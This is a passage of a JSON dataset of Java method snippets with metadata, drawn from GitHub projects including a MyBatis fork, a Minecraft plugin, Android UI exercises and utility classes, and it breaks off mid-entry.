[{"id": 29999, "method_name": "getDatabaseId", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDatabaseId() {\n    return databaseId;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30000, "method_name": "getKeyProperties", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getKeyProperties() {\n    return keyProperties;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30001, "method_name": "getKeyColumns", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getKeyColumns() {\n    return keyColumns;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30002, "method_name": "getStatementLog", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Log", "snippet": "  public Log getStatementLog() {\n    return statementLog;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30003, "method_name": "getLang", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LanguageDriver", "snippet": "  public LanguageDriver getLang() {\n    return lang;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30004, "method_name": "getResultSets", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getResultSets() {\n    return resultSets;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30005, "method_name": "getResulSets", "class_name": "MappedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getResulSets() {\n    return resultSets;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30006, "method_name": "getBoundSql", "class_name": "MappedStatement", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "BoundSql", "snippet": "  public BoundSql getBoundSql(Object parameterObject) {\n    BoundSql boundSql = sqlSource.getBoundSql(parameterObject);\n    List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n    if (parameterMappings == null || parameterMappings.isEmpty()) {\n      boundSql = new BoundSql(configuration, boundSql.getSql(), parameterMap.getParameterMappings(), parameterObject);\n    }\n\n    // check for nested result maps in parameter mappings (issue #30)\n    for (ParameterMapping pm : boundSql.getParameterMappings()) {\n      String rmId = pm.getResultMapId();\n      if (rmId != null) {\n        ResultMap rm = configuration.getResultMap(rmId);\n        if (rm != null) {\n          hasNestedResultMaps |= rm.hasNestedResultMaps();\n        }\n      }\n    }\n    return boundSql;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30007, "method_name": "delimitedStringToArray", "class_name": "MappedStatement", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String[] delimitedStringToArray(String in) {\n    if (in == null || in.trim().length() == 0) {\n      return null;\n    } else {\n      return in.split(\",\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30008, "method_name": "resource", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resource(String resource) {\n      mappedStatement.resource = resource;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30009, "method_name": "id", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String id() {\n      return mappedStatement.id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30010, "method_name": "parameterMap", "class_name": "Builder", "params": ["ParameterMap"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder parameterMap(ParameterMap parameterMap) {\n      mappedStatement.parameterMap = parameterMap;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30011, "method_name": "resultMaps", "class_name": "Builder", "params": ["List<ResultMap>"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultMaps(List<ResultMap> resultMaps) {\n      mappedStatement.resultMaps = resultMaps;\n      for (ResultMap resultMap : resultMaps) {\n        mappedStatement.hasNestedResultMaps = mappedStatement.hasNestedResultMaps || resultMap.hasNestedResultMaps();\n      }\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30012, "method_name": "fetchSize", "class_name": "Builder", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder fetchSize(Integer fetchSize) {\n      mappedStatement.fetchSize = fetchSize;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30013, "method_name": "timeout", "class_name": "Builder", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder timeout(Integer timeout) {\n      mappedStatement.timeout = timeout;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30014, "method_name": "statementType", "class_name": "Builder", "params": ["StatementType"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder statementType(StatementType statementType) {\n      mappedStatement.statementType = statementType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30015, "method_name": "resultSetType", "class_name": "Builder", "params": ["ResultSetType"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultSetType(ResultSetType resultSetType) {\n      mappedStatement.resultSetType = resultSetType == null ? ResultSetType.DEFAULT : resultSetType;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30016, "method_name": "cache", "class_name": "Builder", "params": ["Cache"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder cache(Cache cache) {\n      mappedStatement.cache = cache;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30017, "method_name": "flushCacheRequired", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder flushCacheRequired(boolean flushCacheRequired) {\n      mappedStatement.flushCacheRequired = flushCacheRequired;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30018, "method_name": "useCache", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder useCache(boolean useCache) {\n      mappedStatement.useCache = useCache;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30019, "method_name": "resultOrdered", "class_name": "Builder", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultOrdered(boolean resultOrdered) {\n      mappedStatement.resultOrdered = resultOrdered;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30020, "method_name": "keyGenerator", "class_name": "Builder", "params": ["KeyGenerator"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyGenerator(KeyGenerator keyGenerator) {\n      mappedStatement.keyGenerator = keyGenerator;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30021, "method_name": "keyProperty", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyProperty(String keyProperty) {\n      mappedStatement.keyProperties = delimitedStringToArray(keyProperty);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30022, "method_name": "keyColumn", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder keyColumn(String keyColumn) {\n      mappedStatement.keyColumns = delimitedStringToArray(keyColumn);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30023, "method_name": "databaseId", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder databaseId(String databaseId) {\n      mappedStatement.databaseId = databaseId;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30024, "method_name": "lang", "class_name": "Builder", "params": ["LanguageDriver"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder lang(LanguageDriver driver) {\n      mappedStatement.lang = driver;\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30025, "method_name": "resultSets", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resultSets(String resultSet) {\n      mappedStatement.resultSets = delimitedStringToArray(resultSet);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30026, "method_name": "resulSets", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "    public Builder resulSets(String resultSet) {\n      mappedStatement.resultSets = delimitedStringToArray(resultSet);\n      return this;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30027, "method_name": "build", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MappedStatement", "snippet": "    public MappedStatement build() {\n      assert mappedStatement.configuration != null;\n      assert mappedStatement.id != null;\n      assert mappedStatement.sqlSource != null;\n      assert mappedStatement.lang != null;\n      mappedStatement.resultMaps = Collections.unmodifiableList(mappedStatement.resultMaps);\n      return mappedStatement;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/mapping/MappedStatement.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 30028, "method_name": "resolveCacheRef", "class_name": "CacheRefResolver", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cache", "snippet": "  public Cache resolveCacheRef() {\n    return assistant.useCacheRef(cacheRefNamespace);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/CacheRefResolver.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30029, "method_name": "onEnable", "class_name": "Principal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onEnable() {\n\t\t\n\t\tARQUIVO = newFile(\"argoninc/whitelist_items.cfg\", \"{}\");\n\t\tCONFIG = new Config(ARQUIVO);\n\t\n\t\tif(!CONFIG.has(\"craft\")){\n\t\t\tCONFIG.set(\"craft\", new JSONArray());\n\t\t}\n\t\tif(!CONFIG.has(\"place\")){\n\t\t\tCONFIG.set(\"place\", new JSONArray());\n\t\t}\n\t\tif(!CONFIG.has(\"use\")){\n\t\t\tCONFIG.set(\"use\", new JSONArray());\n\t\t}\n\t\t\n\t\tgetServer().getPluginManager().registerEvents(new ListenerCraft(), this);\n\t\tSystem.out.println(\"***************** ENABLE ******************\");\n\t}", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 30030, "method_name": "onDisable", "class_name": "Principal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDisable() {\n\t\tSystem.out.println(\"***************** DISABLE ******************\");\n\t}", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 30031, "method_name": "newFile", "class_name": "Principal", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "File", "snippet": "\tprivate File newFile(String url, String text) {\n        File file = new File(url);\n        if(!file.getParentFile().exists()) {\n            file.getParentFile().mkdirs();\n        }\n        if(!file.exists()) {\n            try {\n                file.createNewFile();\n\n                if(text!=null) {\n                    FileUtils.write(file, text);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        return file;\n    }", "url": "https://raw.githubusercontent.com/argoninc/Whitelist_Craft_Place/master/src/main/java/com/github/argoninc/Main/Principal.java", "stars": "2", "class_props": {"extends": "JavaPlugin", "implements": null, "modifiers": ["public"]}}, {"id": 30032, "method_name": "onAttachedToWindow", "class_name": "Practice05AnimatorSetLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        view = findViewById(R.id.objectAnimatorView);\n        animateBt = (Button) findViewById(R.id.animateBt);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                view.setTranslationX(-200f);\n\n                ObjectAnimator animator1 = ObjectAnimator.ofFloat(view, \"alpha\", 0, 1);\n                ObjectAnimator animator2 = ObjectAnimator.ofFloat(view, \"translationX\", -200, 200);\n                ObjectAnimator animator3 = ObjectAnimator.ofFloat(view, \"rotation\", 0, 1080);\n                animator3.setDuration(1000);\n\n                AnimatorSet animatorSet = new AnimatorSet();\n                // \u7528 AnimatorSet \u7684\u65b9\u6cd5\u6765\u8ba9\u4e09\u4e2a\u52a8\u753b\u534f\u4f5c\u6267\u884c\n                // \u8981\u6c42 1\uff1a animator1 \u5148\u6267\u884c\uff0canimator2 \u5728 animator1 \u5b8c\u6210\u540e\u7acb\u5373\u5f00\u59cb\n                // \u8981\u6c42 2\uff1a animator2 \u548c animator3 \u540c\u65f6\u5f00\u59cb\n                animatorSet.play(animator1).before(animator2); // \u5148\u6267\u884c 1 \u518d\u6267\u884c 2\n                animatorSet.playTogether(animator2, animator3); // 2 \u548c 3 \u540c\u65f6\u5f00\u59cb\n                animatorSet.start();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/Practice05AnimatorSetLayout.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 30033, "method_name": "newThread", "class_name": "ThreadNameFactory", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "Thread", "snippet": "    public Thread newThread(Runnable r)\n    {\n        Thread t = new Thread(group, r, namePrefix\n                + threadNumber.getAndIncrement(), 0);\n        //\u8bbe\u7f6e\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u8fdb\u7a0b\n        if(daemon) {\n            t.setDaemon(daemon);\n        }else{\n            if (t.isDaemon()) {\n                t.setDaemon(false);\n            }\n            if (t.getPriority() != Thread.NORM_PRIORITY) {\n                t.setPriority(Thread.NORM_PRIORITY);\n            }\n        }\n        return t;\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/factory/ThreadNameFactory.java", "stars": "1", "class_props": {"extends": null, "implements": ["ThreadFactory"], "modifiers": ["public"]}}, {"id": 30034, "method_name": "loadResult", "class_name": "ResultLoader", "params": [], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object loadResult() throws SQLException {\n    List<Object> list = selectList();\n    resultObject = resultExtractor.extractObjectFromList(list, targetType);\n    return resultObject;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30035, "method_name": "selectList", "class_name": "ResultLoader", "params": [], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "List<E>", "snippet": "  private <E> List<E> selectList() throws SQLException {\n    Executor localExecutor = executor;\n    if (Thread.currentThread().getId() != this.creatorThreadId || localExecutor.isClosed()) {\n      localExecutor = newExecutor();\n    }\n    try {\n      return localExecutor.query(mappedStatement, parameterObject, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER, cacheKey, boundSql);\n    } finally {\n      if (localExecutor != executor) {\n        localExecutor.close(false);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30036, "method_name": "newExecutor", "class_name": "ResultLoader", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Executor", "snippet": "  private Executor newExecutor() {\n    final Environment environment = configuration.getEnvironment();\n    if (environment == null) {\n      throw new ExecutorException(\"ResultLoader could not load lazily.  Environment was not configured.\");\n    }\n    final DataSource ds = environment.getDataSource();\n    if (ds == null) {\n      throw new ExecutorException(\"ResultLoader could not load lazily.  DataSource was not configured.\");\n    }\n    final TransactionFactory transactionFactory = environment.getTransactionFactory();\n    final Transaction tx = transactionFactory.newTransaction(ds, null, false);\n    return configuration.newExecutor(tx, ExecutorType.SIMPLE);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30037, "method_name": "wasNull", "class_name": "ResultLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean wasNull() {\n    return resultObject == null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/ResultLoader.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30038, "method_name": "show", "class_name": "JavaVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void show() {\n        System.out.println(\"\u8fd9\u662fJava\u8bfe\u7a0b\u7684\u89c6\u9891\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/JavaVideo.java", "stars": "2", "class_props": {"extends": "Video", "implements": null, "modifiers": ["public"]}}, {"id": 30039, "method_name": "mapThrowable", "class_name": "ExceptionToResourceMapping", "params": ["Throwable"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer mapThrowable(final Throwable throwable) {\n        Throwable throwableToCheck = throwable;\n        int depthToGo = 20;\n\n        while (true) {\n            Integer resId = mapThrowableFlat(throwableToCheck);\n            if (resId != null) {\n                return resId;\n            } else {\n                throwableToCheck = throwableToCheck.getCause();\n                depthToGo--;\n                if (depthToGo <= 0 || throwableToCheck == throwable || throwableToCheck == null) {\n                    Log.d(\"KeventBus\", \"No specific message resource ID found for \" + throwable);\n                    // return config.defaultErrorMsgId;\n                    return null;\n                }\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30040, "method_name": "mapThrowableFlat", "class_name": "ExceptionToResourceMapping", "params": ["Throwable"], "throws": null, "modifiers": ["protected"], "return_type": "Integer", "snippet": "    protected Integer mapThrowableFlat(Throwable throwable) {\n        Class<? extends Throwable> throwableClass = throwable.getClass();\n        Integer resId = throwableToMsgIdMap.get(throwableClass);\n        if (resId == null) {\n            Class<? extends Throwable> closestClass = null;\n            Set<Entry<Class<? extends Throwable>, Integer>> mappings = throwableToMsgIdMap.entrySet();\n            for (Entry<Class<? extends Throwable>, Integer> mapping : mappings) {\n                Class<? extends Throwable> candidate = mapping.getKey();\n                if (candidate.isAssignableFrom(throwableClass)) {\n                    if (closestClass == null || closestClass.isAssignableFrom(candidate)) {\n                        closestClass = candidate;\n                        resId = mapping.getValue();\n                    }\n                }\n            }\n\n        }\n        return resId;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30041, "method_name": "addMapping", "class_name": "ExceptionToResourceMapping", "params": ["Class<Throwable>", "int"], "throws": null, "modifiers": ["public"], "return_type": "ExceptionToResourceMapping", "snippet": "    public ExceptionToResourceMapping addMapping(Class<? extends Throwable> clazz, int msgId) {\n        throwableToMsgIdMap.put(clazz, msgId);\n        return this;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30042, "method_name": "getFilesize", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFilesize() {\n        return filesize;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30043, "method_name": "setFilesize", "class_name": "Quality", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFilesize(String filesize) {\n        this.filesize = filesize;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30044, "method_name": "getSize", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getSize() {\n        return size;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30045, "method_name": "setSize", "class_name": "Quality", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSize(long size) {\n        this.size = size;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30046, "method_name": "getPeers", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPeers() {\n        return super.getPeers();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30047, "method_name": "setPeers", "class_name": "Quality", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPeers(int peers) {\n        super.setPeers(peers);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30048, "method_name": "getSeeds", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSeeds() {\n        return super.getSeeds();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30049, "method_name": "setSeeds", "class_name": "Quality", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeeds(int seeds) {\n        super.setSeeds(seeds);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 30050, "method_name": "addTrait", "class_name": "Genes", "params": ["Trait"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addTrait(Trait t) {\n        if (traits.size() > GENE_LENGTH)\n            traits.remove(0);\n        traits.add(t);\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30051, "method_name": "addTraits", "class_name": "Genes", "params": ["ArrayList<Trait>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addTraits(ArrayList<Trait> traits){\n        traits.forEach((t) -> {\n            addTrait(t);\n        });\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30052, "method_name": "getTraits", "class_name": "Genes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Trait>", "snippet": "    public ArrayList<Trait> getTraits(){\n        return traits;\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30053, "method_name": "main", "class_name": "WebElementCommands", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\n\t\tSystem.setProperty(ChromeDriverService.CHROME_DRIVER_SILENT_OUTPUT_PROPERTY, \"true\");\n\n\t\t// System.setProperty(\"webdriver.chrome.silentOutput\", \"true\");\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", 